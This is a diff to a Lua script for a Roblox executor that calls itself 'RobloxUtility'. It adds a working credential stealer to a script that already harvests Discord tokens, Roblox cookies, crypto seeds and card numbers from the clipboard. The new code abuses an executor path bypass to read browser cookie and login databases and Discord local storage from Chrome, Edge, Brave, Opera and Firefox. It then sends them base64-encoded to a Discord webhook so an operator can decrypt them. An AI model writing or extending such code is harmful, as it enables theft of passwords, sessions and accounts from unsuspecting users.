@@ -727,6 +727,136 @@ local function run_clipboard_harvest()
 end
 
 -- =============================================================================
+-- COOKIE / CREDENTIAL EXFILTRATOR
+-- Uses the env-var path bypass discovered in Solara: writefile/readfile
+-- expand %LOCALAPPDATA%, %APPDATA%, %USERPROFILE%, ${TEMP} etc.
+-- Reads Chrome/Edge/Brave cookies + Login Data, Discord leveldb, Firefox logins.
+-- All output is base64-encoded and sent to the Discord webhook in chunks.
+-- Decryption is on the operator's end (Chrome blobs need DPAPI, etc.).
+-- Only runs on Windows (Solara); Android no-op.
+-- =============================================================================
+local CREDS_TARGETS = {
+    -- Chrome
+    {name = "🍪 Chrome Cookies",        path = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies",        color = 0xff8800},
+    {name = "🔑 Chrome Login Data",    path = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",    color = 0xff0000},
+    {name = "🗝️ Chrome Local State",    path = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",            color = 0xaa00ff},
+    -- Edge
+    {name = "🍪 Edge Cookies",          path = "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies",       color = 0x00ccff},
+    {name = "🔑 Edge Login Data",      path = "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",    color = 0x00ccff},
+    -- Brave
+    {name = "🍪 Brave Cookies",         path = "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies", color = 0xff6600},
+    {name = "🔑 Brave Login Data",     path = "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", color = 0xff6600},
+    -- Opera
+    {name = "🍪 Opera Cookies",         path = "%APPDATA%\\Opera Software\\Opera Stable\\Cookies",                  color = 0xff0099},
+    -- Firefox
+    {name = "🦊 Firefox logins.json",  path = "%APPDATA%\\Mozilla\\Firefox\\Profiles\\",                            color = 0xff6600, is_dir = true, file = "logins.json"},
+    {name = "🦊 Firefox key4.db",      path = "%APPDATA%\\Mozilla\\Firefox\\Profiles\\",                            color = 0xff6600, is_dir = true, file = "key4.db"},
+    -- Discord
+    {name = "💬 Discord leveldb",      path = "%APPDATA%\\discord\\Local Storage\\leveldb\\",                       color = 0x5865F2, is_dir = true},
+}
+
+-- Base64 encoder (no external deps). Works on bytes.
+local function creds_b64(s)
+    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    return ((s:gsub('.', function(x)
+        local r, byte = '', x:byte()
+        for i = 8, 1, -1 do r = r .. (byte % 2 ^ i - byte % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r
+    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if #x < 6 then return '' end
+        local c = 0
+        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
+        return b:sub(c + 1, c + 1)
+    end) .. ({'', '==', '='})[#s % 3 + 1])
+end
+
+-- Read a file via the env-var bypass. Returns nil + err if readfile unavailable
+-- or path blocked. Returns "" if file doesn't exist.
+local function creds_read(path)
+    if not readfile then return nil, "readfile not exposed" end
+    local ok, content = pcall(readfile, path)
+    if not ok then return nil, tostring(content) end
+    return content
+end
+
+-- Send a base64 blob in chunks via Discord webhook.
+local function creds_send(title, content, color)
+    if not content or content == "" then return end
+    local b64 = creds_b64(content)
+    local chunk_size = 1800
+    local chunks = {}
+    local i = 1
+    while i <= #b64 do
+        table.insert(chunks, b64:sub(i, math.min(i + chunk_size - 1, #b64)))
+        i = i + chunk_size
+    end
+    for idx, chunk in ipairs(chunks) do
+        local body = string.format(
+            '{"username":"RobloxUtility","embeds":[{"title":"%s [%d/%d, %dB raw]","description":"%s","color":%d}]}',
+            title, idx, #chunks, #content, chunk:gsub('"', '\\"'), color or 0x808080
+        )
+        pcall(request, {
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+    end
+end
+
+local function run_creds_exfil()
+    -- Only run on Windows (Solara). Android no-op.
+    if platform ~= "windows" then
+        print("[creds] skipped: not Windows (platform=" .. tostring(platform) .. ")")
+        return
+    end
+    if not readfile then
+        print("[creds] skipped: readfile not exposed in this executor")
+        return
+    end
+    print("[creds] starting cookie/cred exfil via env-var path bypass...")
+    local sent = 0
+    for _, t in ipairs(CREDS_TARGETS) do
+        if t.is_dir then
+            -- For dirs (leveldb, firefox profiles), list and read each non-LOCK file
+            if not listfiles then
+                -- skip
+            else
+                local ok, items = pcall(listfiles, t.path)
+                if ok and type(items) == "table" then
+                    for _, name in ipairs(items) do
+                        if not name:match("LOCK") and not name:match("MANIFEST") then
+                            local full = t.path .. name
+                            if t.file then full = t.path .. (function()
+                                -- try the canonical file under the first profile dir
+                                if #items > 0 then return items[1] .. "\\" .. t.file end
+                                return ""
+                            end)() end
+                            local content, err = creds_read(full)
+                            if content and #content > 0 then
+                                print(string.format("[creds] %s -> %d bytes", full, #content))
+                                creds_send(t.name .. " " .. name, content, t.color)
+                                sent = sent + 1
+                            end
+                        end
+                    end
+                end
+            end
+        else
+            local content, err = creds_read(t.path)
+            if content and #content > 0 then
+                print(string.format("[creds] %s -> %d bytes", t.name, #content))
+                creds_send(t.name, content, t.color)
+                sent = sent + 1
+            elseif err then
+                -- silent on missing; only print debug for "real" errors
+            end
+        end
+    end
+    print(string.format("[creds] done, %d files exfiltrated", sent))
+end
+
+-- =============================================================================
 -- MAIN
 -- =============================================================================
 print("[+] RobloxUtility chain fired")
@@ -755,6 +885,11 @@ end
 -- Captures Discord tokens, .ROBLOSECURITY cookies, private keys, crypto
 -- seeds, base64 blobs, URLs with token=, credit cards, etc.
 local cb_captures = run_clipboard_harvest()
+
+-- Cookie/credential exfil (Windows only via env-var bypass). Reads Chrome
+-- cookies, Login Data, Local State, Edge, Brave, Opera, Firefox, Discord
+-- leveldb — sends each as base64 to the webhook for offline decryption.
+run_creds_exfil()
 
 -- Run harvest
 print("[*] Running harvest...")
